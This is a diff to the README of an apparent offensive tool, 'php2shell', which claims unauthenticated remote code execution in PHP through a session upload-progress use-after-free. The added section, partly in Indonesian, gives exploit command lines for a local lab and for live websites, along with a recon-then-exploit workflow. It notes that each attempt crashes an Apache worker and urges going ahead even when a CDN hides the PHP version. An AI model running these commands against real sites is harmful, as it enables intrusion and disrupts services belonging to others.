@@ -15,7 +15,7 @@
 [![License: GPL‑3.0](https://img.shields.io/badge/license-GPL--3.0-informational?style=flat-square)](LICENSE)
 [![Docker](https://img.shields.io/badge/lab-docker%20one--command-2496ED?style=flat-square&logo=docker&logoColor=white)](#-one-command-lab)
 
-[Install](#-install) · [Quick start](#-quick-start) · [Modes](#-modes) · [How it works](#-how-it-works) · [Stealth](#-stealth--anti-bot-detection) · [FAQ](#-faq) · [Disclaimer](#-disclaimer-authorized-use-only)
+[Install](#-install) · [Quick start](#-quick-start) · [Lab vs Live](#-lab-target-vs-live-target--baca-ini-sebelum-menjalankan) · [Modes](#-modes) · [How it works](#-how-it-works) · [Stealth](#-stealth--anti-bot-detection) · [FAQ](#-faq) · [Disclaimer](#-disclaimer-authorized-use-only)
 
 </div>
 
@@ -122,19 +122,75 @@ php2shell exploit \
 ```
 
 ```text
- _______ _   _ ____  ____  ____  _____ _     ___ _____
-|_   _| | | | | _ \|  _ \/ ___|| ____| |   |_ _|_   _|
-  | | | |_| | |_) | |_) \___ \|  _| | |    | |  | |
-  | | |  _  |  _ <|  _ < ___) | |___| |___ | |  | |
-  |_| |_| |_|_| \_\_| \_\____/|_____|_____|___| |_|
+ ____  _   _ ____ ____  ____  _   _ _____ _     _
+|  _ \| | | |  _ \___ \/ ___|| | | | ____| |   | |
+| |_) | |_| | |_) |__) \___ \| |_| |  _| | |   | |
+|  __/|  _  |  __// __/ ___) |  _  | |___| |___| |___
+|_|   |_| |_|_|  |_____|____/|_| |_|_____|_____|_____|
 
-stage 1: heap leak (try 1/3)    → chunk base  = 0x7f687e400000
-stage 2: libphp leak (try 1/3)  → libphp base = 0x7f68800b0000
-stage 3: HTDATA=0x…690d8 ZIF=0x…515370
-        → uid=33(www-data) gid=33(www-data) groups=33(www-data)
-
-PROOF (8.3s): uid=33(www-data)     ✅
+  PHP session.upload_progress UAF  ->  unauthenticated RCE
+  CVE-2026-109618  +  CVE-2026-109619   |   CVSS 9.2   |   PHP 5.4 - 8.x
 ```
+
+*(persis banner yang dicetak CLI saat dijalankan — sumber: `lib/banner.py`)*
+
+---
+
+## ❖ Lab target vs Live target — baca ini sebelum menjalankan
+
+Dua skenario berbeda, dan **command-nya beda**:
+
+### A) Lab lokal (`127.0.0.1`) — full proof
+
+```bash
+php2shell exploit -u http://127.0.0.1:8095/index.php --force --yes \
+    --exploit-profile bookworm -c 'id>/out/p1'
+# → PROOF (8.3s): uid=33(www-data)   ← hasil perintah TERBACA otomatis
+```
+
+Kenapa bisa terbaca? `id>/out/p1` menulis hasil `id` ke file `/out/p1` di
+dalam container, dan folder itu **di-mount ke host** (`out/p1`). Toolkit
+otomatis membacanya → kamu lihat `uid=33(www-data)` di terminal.
+
+### B) Live target (website aktif) — blind by design
+
+```bash
+php2shell exploit -u https://target.example/ --yes -c 'id'
+# → stage 1/2/3 selesai, tapi:
+# → BLIND — perintah terkirim, tapi tidak ada kanal bukti
+```
+
+Di live target **`id>/out/p1` TIDAK berguna** — folder `/out` di server
+target tidak di-mount ke mesinmu, jadi tidak ada yang bisa dibaca. Hasilnya
+`BLIND`: rantai *dieksekusi* (worker mati + restart = jejak jelas di log
+server), tapi output perintah tidak sampai ke kamu.
+
+**Itu keputusan desain, bukan kekurangan:** repot-repot buat "kanal baca
+output" di live target = membuat tool ekstraksi data = melintasi garis
+proof-of-access → backdoor. Toolkit ini sengaja berhenti di bukti *eksekusi*
+(worker crash pattern + stage 3 selesai), bukan bukti *output perintah*.
+
+**Alur kerja yang disarankan di live target:**
+
+```bash
+# 1) RECON dulu — tanpa menyentuh exploit:
+php2shell detect    -u https://target.example/
+php2shell preflight -u https://target.example/
+# verdict: vulnerable / patched / unknown (CDN) + skor kesiapan
+
+# 2) Cek upload_progress & display_errors bocor atau tidak:
+#    kalau CDN menutup versi → tetap boleh lanjut (deteksi bukan gerbang)
+
+# 3) Eksploitasi (kalau target MILIKMU / ada izin):
+php2shell exploit -u https://target.example/ --yes -c 'id'
+# hasil BLIND = dieksekusi tapi output tak terbaca
+# bukti dampak: worker crash di log server + stage-3 completion
+```
+
+> ⚠️ **Sadar risiko di live target:** setiap percobaan membuat 1 worker
+> Apache **mati (SIGABRT)** lalu di-fork ulang. Di server produksi itu =
+> gangguan layanan + jejak log yang sangat jelas + kemungkinan WAF block.
+> Sekali coba sudah cukup untuk membuktikan — loop retry 3×3 hanya untuk lab.
 
 ---
 
